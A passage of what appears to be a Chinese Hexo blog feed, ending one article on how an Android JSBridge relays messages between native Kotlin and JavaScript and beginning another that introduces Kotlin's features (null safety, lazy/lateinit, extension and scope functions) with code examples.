doSendJsCommand(javascriptCommand)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>将<code>​Message</code>​进行序列化，同时处理转义字符的问题，然后第6行将消息格式化为一条对​<code>js</code>​的方法调用指令：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">val</span> JS_HANDLE_MESSAGE_FROM_JAVA =</span><br><span class="line">    <span class="string">"javascript:LkWebViewJavascriptBridge._handleMessageFromNative(\"%s\");"</span></span><br></pre></td></tr></table></figure></li>
<li>实际上调用了之前注入的​<code>_handleMessageFromNative</code>​方法，然后调用​<code>doSendJsCommand</code>​执行指令：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">doSendJsCommand</span><span class="params">(javascriptCommand: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (android.os.Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123;</span><br><span class="line">        evaluateJavascript(javascriptCommand, <span class="literal">null</span>) <span class="comment">// return value not used</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        loadUrl(javascriptCommand)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
现在，消息传递到了<code>​js</code>​的<code>​_handleMessageFromNative()</code>​方法：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// java 调用入口</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">_handleMessageFromNative</span>(<span class="params">messageJSON</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (receiveMessageQueue &amp;&amp; receiveMessageQueue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">         receiveMessageQueue.push(messageJSON);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         _dispatchMessageFromNative(messageJSON);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供给native使用</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">_dispatchMessageFromNative</span>(<span class="params">messageJSON</span>) </span>&#123;</span><br><span class="line">     _log(<span class="string">"&lt;-----raw msg from java----&gt;\n"</span> + messageJSON);</span><br><span class="line">     (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">var</span> message = <span class="built_in">JSON</span>.parse(messageJSON);</span><br><span class="line">         <span class="keyword">var</span> responseCallback;</span><br><span class="line">         <span class="comment">// java call finished, now need to call js callback function</span></span><br><span class="line">         <span class="keyword">if</span> (message.responseId) &#123;</span><br><span class="line">             <span class="comment">// 对某条已发送消息的回复</span></span><br><span class="line">             responseCallback = responseCallbacks[message.responseId];</span><br><span class="line">             <span class="keyword">if</span> (!responseCallback) &#123;</span><br><span class="line">                 <span class="keyword">return</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">var</span> resJson = <span class="built_in">JSON</span>.parse(message.responseData);</span><br><span class="line">             responseCallback(resJson);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 调用js handler</span></span><br><span class="line">             <span class="keyword">if</span> (message.callbackId) &#123;</span><br><span class="line">                 <span class="comment">// java callback</span></span><br><span class="line">                 <span class="keyword">var</span> callbackResponseId = message.callbackId;</span><br><span class="line">                 responseCallback = <span class="function"><span class="keyword">function</span> <span class="title">responseCallback</span>(<span class="params">responseData</span>) </span>&#123;</span><br><span class="line">                     _doSend(&#123;</span><br><span class="line">                         responseId: callbackResponseId,</span><br><span class="line">                         responseData: responseData</span><br><span class="line">                     &#125;);</span><br><span class="line">                 &#125;;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">var</span> handler = LkWebViewJavascriptBridge._messageHandler;</span><br><span class="line">             <span class="comment">// 查找指定handler</span></span><br><span class="line">             <span class="keyword">if</span> (message.handlerName) &#123;</span><br><span class="line">                 handler = messageHandlers[message.handlerName];</span><br><span class="line">             &#125;</span><br><span class="line">             handler(message.data, responseCallback);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;)();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>​_dispatchMessageFromNative</code>​的代码逻辑其实和刚刚分析的​<code>send</code>​方法是一样的（对等的过程），现在我们收到的消息是这样的：<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"responseData"</span>:<span class="string">"&#123; \"data\":\"callback data from java\"&#125;"</span>,<span class="attr">"responseId"</span>:<span class="string">"cb_1_1534851889294"</span>&#125;<span class="string">"</span></span><br></pre></td></tr></table></figure></li>
<li>所以<code>​js</code>​会根据​<code>responseId</code>​从<code>​​responseCallback​s ​map</code>​中取出对应的​<code>callback​</code>并执行。</li>
<li>到这里，一次完整的异步通信就完成了。<h3 id="Native调用JS-Handler过程"><a href="#Native调用JS-Handler过程" class="headerlink" title="Native调用JS Handler过程"></a>Native调用JS Handler过程</h3>这个流程与上一步完全对等，代码逻辑也是一样的，故不再分析。</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
        <category>Hybrid</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Hybrid</tag>
        <tag>JSBridge</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin优势浅析 我们为什么应该使用Kotlin开发新项目</title>
    <url>/2018/07/11/introduce_kotlin/</url>
    <content><![CDATA[<p><img src="/images/introduce_kotlin1.png" alt=""></p>
<h2 id="Backgroud-Target"><a href="#Backgroud-Target" class="headerlink" title="Backgroud/Target"></a>Backgroud/Target</h2><p>由Jetbrains在圣彼得堡的团队开发，得名于附近的一个Kotlin的小岛。</p>
<p>Jetbrains有多年的Java平台开发经验，他们认为Java编程语言有一定的局限性，而且由于需要向后兼容，它们很难得到解决。因此，他们创建了Kotlin项目，主要目标包括：</p>
<ul>
<li>兼容Java</li>
<li>编译速度至少同Java一样快</li>
<li>比Java更安全</li>
<li>比Java更简洁</li>
<li>比最成熟的竞争者Scala还简单</li>
</ul>
<p>与其他JVM上的语言一样，编译成Java字节码</p>
<blockquote>
<p><a href="https://www.kotlincn.net/docs/tutorials/" target="_blank" rel="noopener">https://www.kotlincn.net/docs/tutorials/</a> 中文文档</p>
</blockquote>
<blockquote>
<p><a href="https://kotlinlang.org/docs/reference/comparison-to-java.html" target="_blank" rel="noopener">https://kotlinlang.org/docs/reference/comparison-to-java.html</a> 英文文档中对比Java的索引</p>
</blockquote>
<h2 id="为什么要使用"><a href="#为什么要使用" class="headerlink" title="为什么要使用"></a>为什么要使用</h2><h3 id="非语言层面"><a href="#非语言层面" class="headerlink" title="非语言层面"></a>非语言层面</h3><ul>
<li>Jetbrains自己用于开发桌面IDE</li>
<li>谷歌钦定，不用担心跑路没支持</li>
<li>谷歌Demo和很多开源项目开始全面采用，不学看不懂了</li>
<li>Android Studio支持完善</li>
</ul>
<h3 id="语言层面"><a href="#语言层面" class="headerlink" title="语言层面"></a>语言层面</h3><p>对下文中提到的Kotlin做出的语言上的改进做一个总结：</p>
<ul>
<li>通过语法层面的改进规范了一些行为</li>
<li>“消灭”了NPE</li>
<li>语法更加灵活清晰/减少冗杂的代码</li>
<li>变量声明更加符合直觉</li>
<li>代码逻辑更加收敛/符合直觉</li>
<li>减少样板代码的使用</li>
<li>更舒服的lambda</li>
</ul>
<p>最终归在一点：<strong>集中精力 提高效率 减少错误</strong></p>
<a id="more"></a>
<h2 id="Kotlin做出的改变"><a href="#Kotlin做出的改变" class="headerlink" title="Kotlin做出的改变"></a>Kotlin做出的改变</h2><h3 id="变量-类型"><a href="#变量-类型" class="headerlink" title="变量/类型"></a>变量/类型</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只读变量声明(更友好） 想想final</span></span><br><span class="line"><span class="keyword">val</span> a: <span class="built_in">Int</span> = <span class="number">1</span> <span class="comment">// 后置类型声明</span></span><br><span class="line"><span class="comment">// 一般利用类型推断，思维更加顺畅，不用再关心参数是什么类型的问题</span></span><br><span class="line"><span class="keyword">val</span> a = <span class="number">5</span></span><br><span class="line"><span class="keyword">val</span> s = String()</span><br><span class="line"><span class="keyword">val</span> clazz = s.getClass()</span><br><span class="line"><span class="keyword">val</span> method = clazz.getDeclaredMethod(<span class="string">"name"</span>, <span class="literal">null</span>)  </span><br><span class="line"><span class="comment">// 可变变量声明</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>不再有基本类型的概念，但运行时仍是基本类型表示（除了<code>Int?</code>…这类<code>nullable</code>变量，是包装类型）。</p>
<p>数组用<code>Array&lt;&gt;</code>类型表示，现在数组也是不可协变的了。</p>
<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p><code>if else</code>语句除了与java一致的用法外，还取代了条件运算符<code>?:</code></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> max = <span class="keyword">if</span> (a &gt; b) a <span class="keyword">else</span> b <span class="comment">// int max = (a &gt; b) ? a : b;</span></span><br></pre></td></tr></table></figure>
<p>但用法更加灵活：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">    print(<span class="string">"return a"</span>)</span><br><span class="line">    a</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    print(<span class="string">"return b"</span>)</span><br><span class="line">    b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>for</code>的语法糖：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> array.indices) &#123;</span><br><span class="line">    println(array[i])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ((index, value) <span class="keyword">in</span> array.withIndex()) &#123;</span><br><span class="line">    println(<span class="string">"the element at <span class="variable">$index</span> is <span class="variable">$value</span>"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">3</span>) &#123;</span><br><span class="line">    println(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">6</span> downTo <span class="number">0</span> step <span class="number">2</span>) &#123;</span><br><span class="line">    println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>when</code>取代<code>switch</code>，更加强大的分支：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">when</span> (x) &#123;</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span> -&gt; print(<span class="string">"x == 0 or x == 1"</span>)</span><br><span class="line">    <span class="keyword">else</span> -&gt; print(<span class="string">"otherwise"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">when</span> (x) &#123;</span><br><span class="line">    <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span> -&gt; print(<span class="string">"x is in the range"</span>)</span><br><span class="line">    !<span class="keyword">in</span> <span class="number">10</span>..<span class="number">20</span> -&gt; print(<span class="string">"x is outside the range"</span>)</span><br><span class="line">    <span class="keyword">else</span> -&gt; print(<span class="string">"none of the above"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有返回值</span></span><br><span class="line"><span class="keyword">val</span> hasPrefix = <span class="keyword">when</span>(x) &#123;</span><br><span class="line">    <span class="keyword">is</span> String -&gt; x.startsWith(<span class="string">"prefix"</span>)</span><br><span class="line">    <span class="keyword">else</span> -&gt; <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">when</span> &#123;</span><br><span class="line">    x.isOdd() -&gt; print(<span class="string">"x is odd"</span>)</span><br><span class="line">    x.isEven() -&gt; print(<span class="string">"x is even"</span>)</span><br><span class="line">    <span class="keyword">else</span> -&gt; print(<span class="string">"x is funny"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><p>引入属性的概念，隐式的<code>getter</code>与<code>setter</code>：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">0</span> <span class="comment">// has setter and getter</span></span><br><span class="line">    <span class="keyword">val</span> b = <span class="number">1</span> <span class="comment">// just has getter</span></span><br><span class="line">    <span class="keyword">private</span> c = <span class="number">2</span> <span class="comment">// no setter and getter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> test = Test()</span><br><span class="line">test.a = test.b <span class="comment">// test.setA(test.getB())</span></span><br></pre></td></tr></table></figure><br>再也不用写<code>setter/getter</code>逻辑了：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stringRepresentation: String</span><br><span class="line">    <span class="keyword">get</span>() = <span class="keyword">this</span>.toString()</span><br><span class="line">    <span class="keyword">set</span>(value) &#123;</span><br><span class="line">        setDataFromString(value)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> String getStringRepresentation() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void setStringRepresentation(String value) &#123;</span><br><span class="line">    setDataFromString(value)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>java中已有的<code>getter/setter</code>会被“转换”成kotlin属性的形式</p>
<p><img src="/images/introduce_kotlin2.png" alt=""></p>
<h3 id="Null安全"><a href="#Null安全" class="headerlink" title="Null安全"></a>Null安全</h3><p><img src="/images/introduce_kotlin3.png" alt=""></p>
<p>图灵奖得主托尼·霍尔把<code>Null</code>这个设计称为十亿美元错误：“它导致了数不清的错误、漏洞和系统崩溃，可能在之后 40 年中造成了十亿美元的损失”</p>
<p>Java中，引入了<code>@NonNull</code>和<code>@Nullable</code>注解辅助进行静态检查，有局限性。</p>
<p>Java8引入<code>Optional&lt;&gt;</code>来解决这个问题，写起来比较恶心，难以推广。</p>
<p>Kotlin希望在语言层面去解决这个问题-&gt;引入<code>Nullable</code>类型概念：</p>
<ul>
<li>声明为非空的变量永远都不会为空</li>
<li>声明为可空的变量使用时必须判空</li>
<li>利用推断来提高效率<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nonnull: String = <span class="string">"must be inited with object"</span></span><br><span class="line"><span class="keyword">var</span> nullable: String? = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
在语法层面做了诸多改进：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> l = s?.length <span class="comment">// s != null, l = s.length else l = null, l: Int?</span></span><br><span class="line"><span class="keyword">val</span> l = s!!.length <span class="comment">// same as l = s.length in java, l: Int</span></span><br><span class="line"><span class="keyword">val</span> l = s?.length ?: <span class="number">0</span> <span class="comment">//  s != null, l = s.length else l = 0, l: Int</span></span><br><span class="line"><span class="keyword">return</span> myValue ?: -<span class="number">1</span></span><br><span class="line"><span class="comment">// 链式使用：</span></span><br><span class="line">bob?.department?.head?.name <span class="comment">// 任一为null不执行</span></span><br></pre></td></tr></table></figure>
推断的作用（智能转换）：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// b: String?</span></span><br><span class="line"><span class="keyword">if</span> (b != <span class="literal">null</span> &amp;&amp; b.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// b: String here</span></span><br><span class="line">    print(<span class="string">"length <span class="subst">$&#123;b.length&#125;</span>"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    print(<span class="string">"Empty string"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getStringLength</span><span class="params">(obj: <span class="type">Any</span>)</span></span>: <span class="built_in">Int</span>? &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">is</span> String) &#123;</span><br><span class="line">        <span class="comment">// automatically cast to `String`</span></span><br><span class="line">        <span class="keyword">return</span> obj.length</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `obj` is still of type `Any` outside of the type-checked branch</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
如果被Java调用，由于Java无法保证非空（除非已经使用<code>@NonNull</code>注解注明），从Java接收的参数必须是可空的。</li>
</ul>
<p>实际使用中，使得定义变量时必须要考虑是否可为空的问题，在一开始时如果不适应这种思维，可能会滥用可空类型，给调用带来麻烦。</p>
<p>举个例子：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFragment</span> : <span class="type">Fragment</span></span>() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> manager: MyAPIManager? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void onCreate(savedInstanceState: Bundle?) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line"></span><br><span class="line">        manager = MyAPIManager(context)</span><br><span class="line">        manager.authorize()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里第二行中，由于Kotlin要求我们必须为属性赋予一个初值，但这里的初始化需要用到后面传入的<code>context</code>，按照Java的思维习惯，这个地方很容易就直接把类型改成可空的，然后给了个<code>null</code>的初值，但是这其实违背了Kotlin提供的特性：</p>
<ul>
<li>我们知道其实这个<code>manager</code>对象一旦被初始化之后就不会再为空，所以这应当是个非空类型</li>
<li>同时我们为了后面去初始化它把它设成了<code>var</code>，实际上它并不应当被重新赋值，所以这应当是个<code>val</code>对象</li>
</ul>
<p>Kotlin为我们提供了解决问题的方法：</p>
<h4 id="懒属性（Lazy-Property）"><a href="#懒属性（Lazy-Property）" class="headerlink" title="懒属性（Lazy Property）"></a>懒属性（Lazy Property）</h4><p>当这个属性第一次被使用前再执地初始化代码，代码如下：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFragment</span> : <span class="type">Fragment</span></span>() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> manager: MyAPIManager <span class="keyword">by</span> lazy &#123;</span><br><span class="line">        MyAPIManager(context)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void onCreate(savedInstanceState: Bundle?) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line"></span><br><span class="line">        manager.authorize()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="懒初始化属性（Lateinit-Property）"><a href="#懒初始化属性（Lateinit-Property）" class="headerlink" title="懒初始化属性（Lateinit Property）"></a>懒初始化属性（Lateinit Property）</h4><p>在随后某个确定的时刻初始化，如果在使用时尚未被初始化，会抛出一个未初始化的运行时错误（与NPE略微不同），代码如下：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFragment</span> : <span class="type">Fragment</span></span>() &#123;</span><br><span class="line">    <span class="keyword">lateinit</span> <span class="keyword">var</span> manager: MyAPIManager</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void onCreate(savedInstanceState: Bundle?) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line"></span><br><span class="line">        manager = MyAPIManager(context)</span><br><span class="line">        manager.authorize()</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但这时<code>manager</code>仍是一个<code>var</code>，美中不足。</p>
<p>使用这样的机制可以确保这个对象的可空性满足我们的预期，也就是说经过这样的处理的对象，在Kotlin中永远不会报<code>NPE</code>。而确实可为空的对象，我们利用<code>?</code>表达式结合合适的默认值，是可以把<code>NPE</code>消灭的。</p>
<p>但没有<code>NPE</code>是一件好事吗？错误可能会因默认值变得隐含，虽然不会导致Crash，但给定位bug增加了一定难度。</p>
<p>Kotlin也提供了报<code>NPE</code>的办法：使用<code>!!</code>。</p>
<h4 id="何时用，用哪个？"><a href="#何时用，用哪个？" class="headerlink" title="何时用，用哪个？"></a>何时用，用哪个？</h4><ol>
<li><code>lateinit</code>只用于<code>var</code>，而<code>lazy</code>只用于<code>val</code>。如果是值可修改的变量（即在之后的使用中可能被重新赋值），使用<code>lateinit</code>模式</li>
<li>如果变量的初始化取决于外部对象（例如需要一些外部变量参与初始化），使用<code>lateinit</code>模式。这种情况下，<code>lazy</code>模式也可行但并不直接适用。</li>
<li>如果变量仅仅初始化一次并且全局共享，且更多的是内部使用（依赖于类内部的变量），请使用<code>lazy</code>模式。从实现的角度来看，<code>lateinit</code>模式仍然可用，但<code>lazy</code>模式更有利于封装初始化代码。</li>
<li>不考虑对变量值是否可变的控制，<code>lateinit</code>模式是<code>lazy</code>模式的超集，你可以在任何使用<code>lazy</code>模式的地方用<code>lateinit</code>模式替代, 反之不然。<code>lateinit</code>模式在函数中暴露了太多的逻辑代码，使得代码更加混乱,所以推荐使用<code>lazy</code>，更好的封装了细节，更加安全。</li>
</ol>
<blockquote>
<p><a href="https://kotlinlang.org/docs/reference/null-safety.html" target="_blank" rel="noopener">https://kotlinlang.org/docs/reference/null-safety.html</a></p>
</blockquote>
<blockquote>
<p><a href="https://dev.to/adammc331/understanding-nullability-in-kotlin" target="_blank" rel="noopener">https://dev.to/adammc331/understanding-nullability-in-kotlin</a></p>
</blockquote>
<blockquote>
<p><a href="https://stackoverflow.com/questions/35723226/how-to-use-kotlins-with-expression-for-nullable-types" target="_blank" rel="noopener">https://stackoverflow.com/questions/35723226/how-to-use-kotlins-with-expression-for-nullable-types</a></p>
</blockquote>
<blockquote>
<p><a href="https://medium.com/@agrawalsuneet/safe-calls-vs-null-checks-in-kotlin-f7c56623ab30" target="_blank" rel="noopener">https://medium.com/@agrawalsuneet/safe-calls-vs-null-checks-in-kotlin-f7c56623ab30</a></p>
</blockquote>
<h3 id="函数、扩展方法、Lambda表达式"><a href="#函数、扩展方法、Lambda表达式" class="headerlink" title="函数、扩展方法、Lambda表达式"></a>函数、扩展方法、Lambda表达式</h3><h4 id="函数像其他函数式语言一样，成为了“一等公民”"><a href="#函数像其他函数式语言一样，成为了“一等公民”" class="headerlink" title="函数像其他函数式语言一样，成为了“一等公民”"></a>函数像其他函数式语言一样，成为了“一等公民”</h4><ul>
<li>函数可以在任意地方声明（类外部，甚至是在函数内部）</li>
<li>函数可以像对象一样通过参数传递：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">dfs</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">val</span> f = ::dfs</span><br><span class="line">f(graph)</span><br></pre></td></tr></table></figure>
函数参数终于可以有缺省值了（不用<code>Builder</code>了）：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">reformat</span><span class="params">(str: <span class="type">String</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             normalizeCase: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             upperCaseFirstLetter: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             divideByCamelHumps: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             wordSeparator: <span class="type">Char</span> = <span class="string">' '</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line">reformat(str)</span><br><span class="line">reformat(str, wordSeparator = <span class="string">' '</span>) <span class="comment">// 可以使用参数的名字给缺省参数赋值</span></span><br><span class="line"><span class="comment">// 可以通过@JvmOverloads注解生成Java的重载形式便于Java来调用</span></span><br></pre></td></tr></table></figure>
<h4 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h4></li>
</ul>
<p>比如说，给别人的<code>View</code>加一个功能，给定一个资源<code>Id</code>，去取得它对应的资源：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写一个Util类，作为参数传进去</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> static int findColor(View view, int resId) &#123;</span><br><span class="line">        <span class="keyword">return</span> view.getResources().getColor(resId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ViewUtils.findColor(view, resId);</span><br></pre></td></tr></table></figure><br>通过扩展方法来解决：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> View.<span class="title">findColor</span><span class="params">(id: <span class="type">Int</span>)</span></span> : <span class="built_in">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.resources.getColor(id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view.findColor(resId)</span><br></pre></td></tr></table></figure></p>
<p>一系列这种类型的Java工具类在Kotlin中被“改造”成了扩展方法例如：</p>
<p><code>Collection.sort(list)</code>在Kotlin中直接<code>list.sort()</code>就可以了。</p>
<p>可以完全取代以往的<code>Util</code>类。</p>
<h4 id="Kotlin提供的作用域扩展函数"><a href="#Kotlin提供的作用域扩展函数" class="headerlink" title="Kotlin提供的作用域扩展函数"></a>Kotlin提供的作用域扩展函数</h4><p>语法简洁，逻辑连贯的最主要体现。</p>
<ul>
<li><code>let/run</code><ul>
<li>对象作为参数传入<code>lambda</code>（<code>run</code>则作为<code>this</code>）</li>
<li>返回值为<code>lambda</code>表达式的返回值</li>
<li>常见场景：<ul>
<li>转换类型</li>
<li>处理<code>nullable</code>类型</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> length = s?.let &#123;</span><br><span class="line">    doSomething(it) </span><br><span class="line">    it.length</span><br><span class="line">&#125; ?: <span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if...else...写法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">testIfElse</span><span class="params">()</span></span>: Object? &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> (a !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">val</span> b = handleA(a)</span><br><span class="line">        <span class="keyword">if</span> (b !== <span class="literal">null</span>) &#123;</span><br><span class="line">            handleB(b)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ?.let写法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">testLet</span><span class="params">()</span></span>: Object? &#123;</span><br><span class="line">    <span class="keyword">return</span> a?.let &#123; handleA(it) &#125;?.let &#123; handleB(it) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>apply</code><ul>
<li>对象作为<code>this</code>传入<code>lambda</code></li>
<li>返回值为对象本身</li>
<li>常见场景：<ul>
<li>初始化对象<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old way of building an object</span></span><br><span class="line"><span class="keyword">val</span> andre = Person()</span><br><span class="line">andre.name = <span class="string">"andre"</span></span><br><span class="line">andre.company = <span class="string">"Viacom"</span></span><br><span class="line">andre.hobby = <span class="string">"losing in ping pong"</span></span><br><span class="line"><span class="comment">// after applying 'apply' (pun very much intended)</span></span><br><span class="line"><span class="keyword">val</span> andre = Person().apply &#123;</span><br><span class="line">    name = <span class="string">"Andre"</span></span><br><span class="line">    company = <span class="string">"Viacom"</span></span><br><span class="line">    hobby = <span class="string">"losing in ping pong"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> itemView.animation_like.apply &#123;</span><br><span class="line">    imageAssetsFolder = <span class="string">"images_feedcell/"</span></span><br><span class="line">    loop(<span class="literal">false</span>)</span><br><span class="line">    setAnimation(<span class="string">"like_small.json"</span>)</span><br><span class="line">    setOnClickListener(onClickListener)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><code>also</code><ul>
<li>对象作为参数传入<code>lambda</code></li>
<li>返回值为对象本身</li>
<li>常见场景：<ul>
